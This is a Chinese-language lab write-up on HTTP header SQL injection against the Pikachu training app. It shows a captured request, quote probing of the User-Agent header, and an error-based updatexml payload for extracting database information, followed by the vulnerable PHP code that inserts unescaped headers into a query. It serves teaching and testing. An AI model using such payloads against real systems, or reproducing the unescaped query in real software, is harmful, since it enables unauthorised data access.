---
title: "http header注入"
date: 2024-07-26
---
---

# 什么是 Http Header 注入

有些时候，后台开发人员为了验证客户端头信息(比如常用的 cookie 验证)或者通过 http header 头信息获取客户端的一些信息，比如 useragent、accept 字段等等，会**对客户端的 http header 信息进行获取并使用 SQL 进行处理**，如果此时没有足够的安全考虑则可能会导致基于 http header 的 SQL Inject 漏洞。😨
![sql_header_1](https://i-blog.csdnimg.cn/blog_migrate/27fcfb3e0a10a812b7d791824968e014.png)
如图所示，后台记录了

- ip
- user agent
- http accept
- 端口

用**Brup Suite**抓包，发送到 Repeater 模块，进行下一步操作      
数据包如下：
```http
GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1
Host: localhost
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Referer: http://localhost/vul/sqli/sqli_header/sqli_header_login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=mqh6eiafgudgijl5g1mb8hpbn0
Connection: close
```

😋 来尝试修改一下

```http
User-Agent: 114514
Accept: 1919810
```

响应：

```
朋友，你好，你的信息已经被记录了:点击退出
你的ip地址:127.0.0.1
你的user agent:114514
你的http accept:1919810
你的端口(本次连接):tcp11427
```

🤮 好臭的响应结果       
可以看到数据包中的 user-agent、accept 字段被获取，可能存在注入点        
🤔 将 User-Agent 字段改成单引号`'`：

```http
User-Agent: '
```

🥵 发送请求，报错了

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag' at line 1
```

🧐ok 了，现在来分析一下，猜测这种情况是

- 一次获取了多个数据，
- 每个数据用单引号`'`包裹，
- 应该和**_insert、update 注入.md_**类似，
- 可能使用了`values`函数

```sql
values('$data1','$data2','$data3','$data4','$data5')
```

选择其中一个 data 位置进行注入      
构造以下命令：

```sql
insert into 表名(列名1,列名2,列名3,列名4) values('1' or updatexml(1,concat(0x7e,database()),0) or '','数据2','数据3','数据4');
```

数据 1 的位置就是 payload

```sql
# payload:
1' or updatexml(1,concat(0x7e,database()),0) or '
```

修改数据包，把 payload 放到 User-Agent 字段：

```http
User-Agent: 1' or updatexml(1,concat(0x7e,database()),0) or '
```

![](https://img2023.cnblogs.com/blog/1779065/202212/1779065-20221203110842711-1465449530.png)

- `or`判断会把左右的表达式先执行一遍
- 执行`updatexml()`函数时利用函数报错获取信息
- 把`database()`的位置换成你想要的命令

放一下原代码`pikachu-master\vul\sqli\sqli_header\sqli_header.php`：

```php
$is_login_id=check_sqli_login($link);
if(!$is_login_id){
    header("location:sqli_header_login.php");
}
// $remoteipadd=escape($link, $_SERVER['REMOTE_ADDR']);
// $useragent=escape($link, $_SERVER['HTTP_USER_AGENT']);
// $httpaccept=escape($link, $_SERVER['HTTP_ACCEPT']);
// $httpreferer=escape($link, $_SERVER['HTTP_REFERER']);


//直接获取前端过来的头信息,没人任何处理,留下安全隐患
$remoteipadd=$_SERVER['REMOTE_ADDR'];
$useragent=$_SERVER['HTTP_USER_AGENT'];
$httpaccept=$_SERVER['HTTP_ACCEPT'];
$remoteport=$_SERVER['REMOTE_PORT'];

//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞
$query="insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values('$is_login_id','$remoteipadd','$useragent','$httpaccept','$remoteport')";
$result=execute($link, $query);


if(isset($_GET['logout']) && $_GET['logout'] == 1){
    setcookie('ant[uname]','',time()-3600);
    setcookie('ant[pw]','',time()-3600);
    header("location:sqli_header_login.php");
}
```
